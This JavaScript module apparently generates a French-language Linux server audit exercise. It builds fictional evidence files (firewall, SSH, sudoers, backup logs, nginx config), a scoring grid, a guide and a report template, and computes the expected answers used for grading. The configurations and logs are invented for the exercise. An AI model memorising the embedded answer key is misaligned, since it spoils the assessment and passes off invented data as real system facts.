    { id: "SA2", domaine: "sauvegardes", poids: 2, critere: "Conforme si la dernière copie hors site réussie a sept jours ou moins ; partiel si elle date de huit à quatorze jours ; non au-delà.", statut: "p" },
    { id: "SA3", domaine: "sauvegardes", poids: 2, critere: "Conforme si un test de restauration réussi date de 90 jours ou moins ; partiel s’il date de 91 à 180 jours ; non au-delà ou s’il est absent.", statut: "c" },
    { id: "SA4", domaine: "sauvegardes", poids: 2, critere: "Conforme si le dépôt chiffre les données et vérifie l’intégrité avec SHA-256 ou mieux ; partiel si une seule de ces deux conditions est vraie ; non sinon.", statut: "c" },
    { id: "SE1", domaine: "configuration des services", poids: 2, critere: "Conforme si MariaDB écoute uniquement sur 127.0.0.1 ou localhost ; partiel si elle écoute sur une adresse interne seulement ; non sinon.", statut: "c" },
    { id: "SE2", domaine: "configuration des services", poids: 3, critere: "Conforme si le dossier d’upload empêche l’exécution de PHP ; partiel si la protection n’est présente que dans une seule couche (nginx ou PHP-FPM) ; non sinon.", statut: "n" },
    { id: "SE3", domaine: "configuration des services", poids: 1, critere: "Conforme si aucun service n’est en échec, auditd mis à part puisqu’il est déjà jugé par JO3 ; partiel s’il y en a exactement un ; non s’il y en a deux ou plus.", statut: "p" },
    { id: "SE4", domaine: "configuration des services", poids: 2, critere: "Conforme si les scripts appelés par cron root appartiennent à root et ne sont pas modifiables par d’autres ; partiel si un seul script appelle un chemin indirect ; non sinon.", statut: "c" },
  ];

  const systemProof = [
    "# /etc/os-release",
    'PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"',
    'NAME="Debian GNU/Linux"',
    'VERSION_ID="12"',
    'VERSION="12 (bookworm)"',
    'VERSION_CODENAME=bookworm',
    'ID=debian',
    "",
    "# calendrier de support de la distribution (publié par l’éditeur)",
    "version=12 (bookworm) publication=2023-06-10 support_standard_jusqu_au=2026-07-11 support_etendu_jusqu_au=2028-06-30",
    "",
    "# apt list --upgradable",
    "Listing...",
    "openssh-server/bookworm-security 1:9.2p1-2+deb12u7 amd64 [upgradable from: 1:9.2p1-2+deb12u5]",
    "openssl/bookworm-security 3.0.14-1~deb12u2 amd64 [upgradable from: 3.0.14-1~deb12u1]",
    "linux-image-amd64/bookworm-security 6.1.0-31 amd64 [upgradable from: 6.1.0-29]",
    "libssl3/bookworm-security 3.0.14-1~deb12u2 amd64 [upgradable from: 3.0.14-1~deb12u1]",
    "curl/bookworm-updates 7.88.1-10+deb12u8 amd64 [upgradable from: 7.88.1-10+deb12u7]",
    "git/bookworm 1:2.39.5-0+deb12u2 amd64 [upgradable from: 1:2.39.5-0+deb12u1]",
    "less/bookworm 590-2.1~deb12u2 amd64 [upgradable from: 590-2.1~deb12u1]",
    "nano/bookworm 7.2-1+deb12u1 amd64 [upgradable from: 7.2-1]",
    "python3-urllib3/bookworm 1.26.12-1+deb12u1 all [upgradable from: 1.26.12-1]",
    "tar/bookworm 1.34+dfsg-1.2+deb12u1 amd64 [upgradable from: 1.34+dfsg-1.2]",
    "tzdata/bookworm 2026a-0+deb12u1 all [upgradable from: 2025c-0+deb12u1]",
    "vim/bookworm 2:9.0.1378-2+deb12u2 amd64 [upgradable from: 2:9.0.1378-2+deb12u1]",
    "",
    "# df -h",
    "Filesystem      Size  Used Avail Use% Mounted on",
    "/dev/vda1        60G   47G   10G  83% /",
    "/dev/vdb1       120G   54G   60G  48% /srv",
    "tmpfs           512M   12M  500M   3% /run",
    "tmpfs           512M  9.6M  503M   2% /tmp",
    "",
    "# df -i",
    "Filesystem      Inodes IUsed   IFree IUse% Mounted on",
    "/dev/vda1      3932160 711842 3220318   19% /",
    "/dev/vdb1      7864320 120332 7743988    2% /srv",
    "tmpfs            65536   1215   64321    2% /run",
    "tmpfs            65536    224   65312    1% /tmp",
    "",
    "# lsblk -f",
    "NAME FSTYPE FSVER LABEL UUID                                 FSAVAIL FSUSE% MOUNTPOINTS",
    "vda",
    "└─vda1 ext4   1.0         8b1d9854-6a39-4c01-9b8a-4a7f673f0001   10G    83% /",
    "vdb",
    "└─vdb1 ext4   1.0  partages 0d2813de-6a39-4c01-9b8a-4a7f673f0002   60G    48% /srv",
    "",
    "# findmnt /tmp",
    "TARGET SOURCE FSTYPE OPTIONS",
    "/tmp   tmpfs  tmpfs  rw,nosuid,nodev,noexec,relatime,size=524288k",
    "",
    "# sysctl net.ipv4.ip_forward net.ipv4.conf.all.rp_filter",
    "net.ipv4.ip_forward = 0",
    "net.ipv4.conf.all.rp_filter = 1",
  ].join("\n") + "\n";

  const accessProof = [
    "# /etc/passwd",
    ...passwdRows,
    "",
    "# /etc/shadow",
    ...shadowRows,
    "",
    "# /etc/group",
    "sudo:x:27:odiallo,adjovi,svc-backup",
    "webdev:x:110:nkamga",
    "backup:x:994:svc-backup",
    "",
    "# /etc/sudoers.d/web-maintenance",
    "odiallo ALL=(ALL) ALL",
    "nkamga ALL=(root) NOPASSWD: /usr/bin/systemctl reload nginx, /usr/bin/journalctl -u nginx.service",
    "svc-backup ALL=(root) NOPASSWD: /usr/bin/systemctl start backup-nuit.service, /usr/bin/systemctl stop backup-nuit.service, /usr/bin/systemctl status backup-nuit.service",
    "",
    "# sshd -T",
    "port 22",
    "protocol 2",
    "permitrootlogin no",
    "passwordauthentication yes",
    "kbdinteractiveauthentication no",
    "pubkeyauthentication yes",
    "permitemptypasswords no",
    "authenticationmethods any",
    "allowtcpforwarding no",
    "x11forwarding no",
    "allowusers odiallo adjovi nkamga svc-backup",
    "logingracetime 30",
    "clientaliveinterval 300",
    "maxauthtries 3",
    "",
    "# ufw status numbered",
    "Status: active",
    "",
    "     To                         Action      From",
    "     --                         ------      ----",
    "[ 1] 22/tcp                     ALLOW IN    10.20.0.100",
    "[ 2] 80/tcp                     ALLOW IN    Anywhere",
    "[ 3] 443/tcp                    ALLOW IN    Anywhere",
    "[ 4] 873/tcp                    ALLOW IN    Anywhere",
    "[ 5] 22/tcp (v6)               DENY IN     Anywhere (v6)",
    "",
    "# ufw defaults",
    "Default: deny (incoming), allow (outgoing), disabled (routed)",
    "",
    "# ss -tulpn",
    "Netid State  Recv-Q Send-Q Local Address:Port Peer Address:Port Process",
    'tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*     users:(("sshd",pid=812,fd=3))',
    'tcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:*     users:(("nginx",pid=1421,fd=6))',
    'tcp   LISTEN 0      511          0.0.0.0:443       0.0.0.0:*     users:(("nginx",pid=1421,fd=7))',
    'tcp   LISTEN 0      128          0.0.0.0:873       0.0.0.0:*     users:(("rsync",pid=1788,fd=5))',
    'tcp   LISTEN 0      128        127.0.0.1:3306      0.0.0.0:*     users:(("mariadbd",pid=1355,fd=22))',
    'tcp   ESTAB  0      0          10.20.0.20:22       10.20.0.100:44112 users:(("sshd",pid=812,fd=4),("sshd",pid=2144,fd=4))',
    'tcp   ESTAB  0      0          10.20.0.20:443      203.0.113.18:50116 users:(("nginx",pid=1422,fd=12))',
    'tcp   ESTAB  0      0          10.20.0.20:443      203.0.113.24:50144 users:(("nginx",pid=1423,fd=13))',
    'tcp   ESTAB  0      0          10.20.0.20:873      10.20.0.30:53511 users:(("rsync",pid=1788,fd=6))',
    'udp   UNCONN 0      0       127.0.0.53%lo:53       0.0.0.0:*     users:(("systemd-resolved",pid=655,fd=14))',
  ].join("\n") + "\n";

  const backupJournal = [];
  const backupStart = Date.parse("2026-04-01T02:30:00Z");
  for (let day = 0; day < 27; day += 1) {
    const current = new Date(backupStart + day * dayMs);
    const isoPrefix = current.toISOString().replace(".000Z", "Z");
    if (day <= 20) {
      backupJournal.push(`${isoPrefix} | SUCCESS | repo=restic-local offsite=${day <= 17 ? "yes" : "pending"} hash=sha256 size=${48 + day}G`);
    } else if (day === 21) {
      backupJournal.push(`${isoPrefix} | FAIL | repo=restic-local reason=rsync timeout to srv-sauvegarde01`);
    } else if (day === 22) {
      backupJournal.push(`${isoPrefix} | FAIL | repo=restic-local reason=offsite destination unavailable`);
    } else if (day === 23) {
      backupJournal.push(`${isoPrefix} | FAIL | repo=restic-local reason=repository locked`);
    } else if (day === 24) {
      backupJournal.push(`${isoPrefix} | SUCCESS | repo=restic-local offsite=pending hash=sha256 size=71G`);
    } else if (day === 25) {
      backupJournal.push(`${isoPrefix} | FAIL | repo=restic-local reason=offsite destination unavailable`);
    } else {
      backupJournal.push(`${isoPrefix} | FAIL | repo=restic-local reason=offsite destination unavailable`);
    }
  }

  const servicesProof = [
    "# systemctl list-units --type=service --all --no-pager",
    "  UNIT                      LOAD   ACTIVE   SUB     DESCRIPTION",
    "  nginx.service             loaded active   running A high performance web server",
    "  php8.2-fpm.service        loaded active   running The PHP 8.2 FastCGI Process Manager",
    "  mariadb.service           loaded active   running MariaDB 10.11.6 database server",
    "  rsyslog.service           loaded active   running System Logging Service",
    "  fail2ban.service          loaded active   running Fail2Ban Service",
    "  backup-nuit.service       loaded active   exited  Sauvegarde nocturne",
    "  auditd.service            loaded failed   failed  Security Auditing Service",
    "  legacy-sync.service       loaded failed   failed  Ancienne synchro prestataire",
    "  cron.service              loaded active   running Regular background program processing daemon",
    "  ssh.service               loaded active   running OpenBSD Secure Shell server",
    "",
    "# /etc/rsyslog.d/60-central.conf",
    "# action(type=\"omfwd\" target=\"srv-log01.alize.example\" port=\"514\" protocol=\"tcp\")",
    "",
    "# /etc/logrotate.d/nginx",
    "/var/log/nginx/*.log {",
    "    weekly",
    "    rotate 8",
    "    compress",
    "    delaycompress",
    "    missingok",
    "    notifempty",
    "    create 640 www-data adm",
    "}",
    "",
    "# /etc/cron.d/backup-nuit",
    "30 2 * * * root /usr/local/bin/backup-nightly.sh >/var/log/backup-nightly.log 2>&1",
    "",
    "# /etc/cron.d/cache-prime",
    "5 */6 * * * root /usr/local/bin/cache-prime.sh >/var/log/cache-prime.log 2>&1",
    "",
    "# ls -l --time-style=long-iso /usr/local/bin/backup-nightly.sh",
    "-rwxr-x--- 1 root root 812 2026-02-18 07:14 /usr/local/bin/backup-nightly.sh",
    "# ls -l --time-style=long-iso /usr/local/bin/cache-prime.sh",
    "-rwxr-x--- 1 root root 544 2026-03-02 06:10 /usr/local/bin/cache-prime.sh",
    "",
    "# restic snapshots",
    "ID        Time                 Host             Tags        Paths",
    "a10f92d1  2026-04-16 02:31:07 srv-fichiers01   nightly     /srv/partages /etc",
    "b11f92d2  2026-04-17 02:31:10 srv-fichiers01   nightly     /srv/partages /etc",
    "c12f92d3  2026-04-18 02:31:11 srv-fichiers01   nightly     /srv/partages /etc",
    "d13f92d4  2026-04-19 02:31:10 srv-fichiers01   nightly     /srv/partages /etc",
    "e14f92d5  2026-04-20 02:31:11 srv-fichiers01   nightly     /srv/partages /etc",
    "f15f92d6  2026-04-21 02:31:12 srv-fichiers01   nightly     /srv/partages /etc",
    "d19f92da  2026-04-25 02:31:09 srv-fichiers01   nightly     /srv/partages /etc",
    "",
    "# backup-nightly.log",
    ...backupJournal,
    "",
    "# offsite-replication.log",
    "2026-04-18T03:12:44Z | SUCCESS | destination=srv-sauvegarde01 snapshot=c12f92d3",
    "2026-04-19T03:12:47Z | FAIL | destination=srv-sauvegarde01 reason=link reset",
    "2026-04-20T03:12:49Z | FAIL | destination=srv-sauvegarde01 reason=link reset",
    "2026-04-21T03:12:51Z | FAIL | destination=srv-sauvegarde01 reason=timeout",
    "2026-04-22T03:12:55Z | FAIL | destination=srv-sauvegarde01 reason=timeout",
    "2026-04-23T03:12:58Z | FAIL | destination=srv-sauvegarde01 reason=timeout",
    "2026-04-24T03:13:02Z | FAIL | destination=srv-sauvegarde01 reason=destination unavailable",
    "2026-04-25T03:13:05Z | FAIL | destination=srv-sauvegarde01 reason=destination unavailable",
    "2026-04-26T03:13:08Z | FAIL | destination=srv-sauvegarde01 reason=destination unavailable",
    "2026-04-27T03:13:11Z | FAIL | destination=srv-sauvegarde01 reason=destination unavailable",
    "",
    "# restore-tests.log",
    "2026-02-18T10:14:00Z | RESTORE_OK | archive=c8d9f0aa target=/tmp/restore-check",
    "",
    "# restic config",
    "repository_version=2",
    "encryption=aes256-ctr",
    "integrity=sha256",
    "",
    "# /etc/nginx/sites-enabled/alize.conf",
    "server {",
    "    listen 80;",
    "    listen 443 ssl http2;",
    "    server_name www.alize.example;",
    "    root /var/www/html/alize;",
    "    location /uploads/ {",
    "        alias /var/www/html/alize/uploads/;",
    "        try_files $uri $uri/ =404;",
    "    }",
    "}",
    "",
    "# /etc/php/8.2/fpm/pool.d/www.conf",
    "; no dedicated protection for uploads here",
    "",
    "# /etc/mysql/mariadb.conf.d/50-server.cnf",
    "bind-address = 127.0.0.1",
    "",
    "# find / -xdev -perm -4000 -type f -ls",
    "  40201    56 -rwsr-xr-x   1 root     root        59704 2025-12-18 10:20 /usr/bin/passwd",
    "  40277    52 -rwsr-xr-x   1 root     root        48896 2025-12-18 10:20 /usr/bin/su",
    "  40411    48 -rwsr-xr-x   1 root     root        35128 2025-12-18 10:20 /usr/bin/umount",
  ].join("\n") + "\n";

  const gridText = [
    "# Grille d’audit Linux",
    "",
    "## Règles générales",
    "",
    "- Statuts : conforme = 1 ; partiel = 0,5 ; non = 0.",
    "- Score pondéré d’un domaine = somme des poids du domaine multipliés par la valeur du statut, divisée par la somme des poids du domaine, puis conversion en pourcentage entier avec 0,5 vers le haut.",
    "- Score global = somme de tous les poids multipliés par la valeur du statut, divisée par la somme de tous les poids, puis conversion en pourcentage entier avec 0,5 vers le haut.",
    "- Priorisation des actions : commence par les contrôles jugés partiels ou non conformes, calcule le risque avec vraisemblance × impact, puis trie par risque décroissant et effort croissant.",
    "- Gain rapide : action liée à un contrôle jugé partiel ou non conforme, avec effort égal à 1 et risque au moins égal à 6.",
    "- Niveaux de risque : faible de 1 à 3, moyen de 4 à 7, élevé de 8 à 11, critique de 12 à 16.",
    "- Niveaux de maturité : a de 0 à 39, b de 40 à 59, c de 60 à 79, d de 80 à 100.",
    "",
    "| id | domaine | poids | statut | critère d’évaluation |",
    "|---|---|---:|---|---|",
    ...controls.map((control) => `| ${control.id} | ${control.domaine} | ${control.poids} |  | ${control.critere} |`),
  ].join("\n") + "\n";

  const guideText = [
    "# Guide de l’évaluation : auditer un serveur Linux et rédiger le rapport",
    "",
    "> Cadre et limites",
    ">",
    "> Toutes les preuves de ce projet sont fictives.",
    "> Tu travailles en lecture seule sur des exports déjà collectés.",
    "> N’applique jamais une recommandation de ce guide sur un système réel sans validation préalable.",
    "",
    "## Méthode",
    "",
    "1. Lis d’abord la grille « lnx-proj-grille-audit.md » : c’est elle qui fixe les seuils, les poids, la priorité et la maturité.",
    "2. Note toi-même les 24 contrôles à partir des preuves. Ne suppose rien : chaque statut doit être justifié par une ligne ou par un calcul issu des exports.",
    "3. Calcule ensuite les scores du domaine demandé puis le score global. Les actions prioritaires ne se choisissent qu’après avoir identifié les contrôles partiels ou non conformes.",
    "",
    "## Variante visionneuse du site",
    "",
    "Tape un mot ou un nombre pour ne garder que les lignes qui le contiennent. Tu peux tester avec des exemples génériques comme « security », « restore », « failed » ou « default », puis relire les colonnes utiles dans les lignes restantes.",
    "",
    "## Commandes utiles avec Git Bash",
    "",
    "```bash",
    "cat > demo-systeme.txt <<'EOF'",
    "openssh-server/demo-security 9.9 amd64 [upgradable from: 9.8]",
    "tmpfs /work tmpfs rw,nosuid,nodev 0 0",
    "net.ipv4.ip_forward = 0",
    "EOF",
    "system_demo=$(grep -nE 'demo-security|tmpfs /work|ip_forward' demo-systeme.txt | wc -l)",
    "cat > demo-risques.txt <<'EOF'",
    "id;controle;vraisemblance;impact;effort",
    "R-1;journalisation;3;4;1",
    "R-2;restauration;2;3;2",
    "EOF",
    "risk_demo=$(awk -F';' 'NR>1 {print $1, $2, $3 * $4, $5}' demo-risques.txt | wc -l)",
    "printf 'Démo audit prête pour filtrer des preuves techniques : %s ligne(s).\\nDémo audit prête pour calculer un risque : %s ligne(s).\\n' \"$system_demo\" \"$risk_demo\"",
    "```",
    "",
    "## Commandes utiles avec Windows PowerShell",
    "",
    "```powershell",
    "@'",
    "openssh-server/demo-security 9.9 amd64 [upgradable from: 9.8]",
    "tmpfs /work tmpfs rw,nosuid,nodev 0 0",
    "net.ipv4.ip_forward = 0",
    "'@ | Set-Content -Encoding UTF8 demo-systeme.txt",
    "$systemDemo = (Get-Content -Encoding UTF8 \"demo-systeme.txt\" | Select-String 'demo-security|tmpfs /work|ip_forward').Count",
    "@'",
    "id;controle;vraisemblance;impact;effort",
    "R-1;journalisation;3;4;1",
    "R-2;restauration;2;3;2",
    "'@ | Set-Content -Encoding UTF8 demo-risques.txt",
    "$riskDemo = (Import-Csv -Delimiter ';' -Path \"demo-risques.txt\" | Select-Object id,controle,vraisemblance,impact,effort).Count",
    "\"Démo audit prête pour filtrer des preuves techniques : $systemDemo ligne(s).\"",
    "\"Démo audit prête pour calculer un risque : $riskDemo ligne(s).\"",
    "```",
    "",
    "## Exemple générique, avec des valeurs inventées et sans rapport avec ce labo",
    "",
    "```bash",
    "awk 'BEGIN { p=13.5; w=20; print int((p / w) * 100 + 0.5) }'",
    "```",
    "",
    "```powershell",
    "[math]::Floor(((13.5 / 20) * 100) + 0.5)",
    "```",
    "",
    "## Repères",
    "",
    "La grille te donne les seuils ; les exports te donnent les faits. Si un score semble surprenant, reviens d’abord aux preuves du contrôle concerné avant de recalculer le domaine entier.",
  ].join("\n") + "\n";

  const reportTemplate = [
    "# Modèle de rapport d’audit Linux",
    "",
    "## 1. Contexte et périmètre",
    "- Machine auditée :",
    "- Date de visite :",
    "- Export(s) utilisés :",
    "",
    "## 2. Statut des contrôles",
    "- Contrôles conformes :",
    "- Contrôles partiels :",
    "- Contrôles non conformes :",
    "",
    "## 3. Scores",
    "- Score global :",
    "- Domaine le plus faible :",
    "- Commentaire de synthèse :",
    "",
    "## 4. Priorités",
    "- Action prioritaire n°1 :",
    "- Gains rapides :",
    "",
    "## 5. Recommandations à 90 jours",
    "- Semaine 1 :",
    "- Mois 1 :",
    "- Mois 2 à 3 :",
  ].join("\n") + "\n";

  const statusValue = { c: 1, p: 0.5, n: 0 };
  const domainLetterByName = {
    "accès et comptes": "a",
    "réseau": "b",
    "système et correctifs": "c",
    "journalisation": "d",
    "sauvegardes": "e",
    "configuration des services": "f",
  };
  const scoredRisks = risks.map((row) => ({ ...row, riskScore: Number(row.vraisemblance) * Number(row.impact) }))
    .sort((left, right) => right.riskScore - left.riskScore || Number(left.effort) - Number(right.effort) || left.id.localeCompare(right.id));
  const domainScores = [...new Set(controls.map((row) => row.domaine))].map((domain) => {
    const rows = controls.filter((row) => row.domaine === domain);
    const weight = rows.reduce((sum, row) => sum + row.poids, 0);
    const points = rows.reduce((sum, row) => sum + row.poids * statusValue[row.statut], 0);
    return {
      domaine: domain,
      score: roundPercent((points / weight) * 100),
      ratio: points / weight,
    };
  }).sort((left, right) => left.ratio - right.ratio || left.domaine.localeCompare(right.domaine));
  const totalWeight = controls.reduce((sum, row) => sum + row.poids, 0);
  const totalPoints = controls.reduce((sum, row) => sum + row.poids * statusValue[row.statut], 0);
  const globalScorePercent = roundPercent((totalPoints / totalWeight) * 100);
  const maturityLetter = globalScorePercent <= 39 ? "a" : globalScorePercent <= 59 ? "b" : globalScorePercent <= 79 ? "c" : "d";
  const maturityLabel = { a: "initial", b: "fragile", c: "maîtrise", d: "robuste" }[maturityLetter];

  return {
    files: [
      { name: "lnx-proj-preuves-systeme.txt", data: text(systemProof) },
      { name: "lnx-proj-preuves-acces.txt", data: text(accessProof) },
      { name: "lnx-proj-preuves-services.txt", data: text(servicesProof) },
      { name: "lnx-proj-risques.txt", data: text(tsv(["id", "controle", "mesure", "vraisemblance", "impact", "effort"], risks)) },
      { name: "lnx-proj-grille-audit.md", data: text(gridText) },
      { name: "lnx-proj-modele-rapport.md", data: text(reportTemplate) },
      { name: "lnx-proj-guide.md", data: text(guideText) },
    ],
    facts: {
      auditDate,
      assetNames: {
        systemFile: "lnx-proj-preuves-systeme.txt",
        accessFile: "lnx-proj-preuves-acces.txt",
        servicesFile: "lnx-proj-preuves-services.txt",
        risksFile: "lnx-proj-risques.txt",
        gridFile: "lnx-proj-grille-audit.md",
        reportFile: "lnx-proj-modele-rapport.md",
        guideFile: "lnx-proj-guide.md",
      },
      statusLetters: {
        AC1: controls.find((row) => row.id === "AC1").statut,
        AC2: controls.find((row) => row.id === "AC2").statut,
        AC3: controls.find((row) => row.id === "AC3").statut,
        SY1: controls.find((row) => row.id === "SY1").statut,
        SY3: controls.find((row) => row.id === "SY3").statut,
        JO3: controls.find((row) => row.id === "JO3").statut,
        JO4: controls.find((row) => row.id === "JO4").statut,
        SA1: controls.find((row) => row.id === "SA1").statut,
        SE2: controls.find((row) => row.id === "SE2").statut,
      },
      securityUpdatesCount: 4,
      permitRootLogin: "no",
      openAllInterfacesCount: 4,
      lastBackupSuccessDate: "2026-04-25",
      lastBackupAgeDays: dayDiff("2026-04-25", auditDate),
      domainScoreTarget: "journalisation",
      domainScorePercent: domainScores.find((row) => row.domaine === "journalisation").score,
      globalScorePercent,
      weakestDomainLetter: domainLetterByName[domainScores[0].domaine],
      topPriorityAction: scoredRisks[0].id,
      quickWinCount: scoredRisks.filter((row) => row.riskScore >= 6 && Number(row.effort) === 1).length,
      highestRisk: scoredRisks[0].riskScore,
      maturityLetter,
      maturityLabel,
    },
  };
}

function buildLinuxAssetsC() {
  const incident = buildIncidentAssets();
  const projet = buildProjectAssets();
  return {
    files: [...incident.files, ...projet.files],
    facts: {
      incident: incident.facts,
      projet: projet.facts,
    },
  };
}

module.exports = { buildLinuxAssetsC, sha256: (value) => createHash("sha256").update(value).digest("hex") };
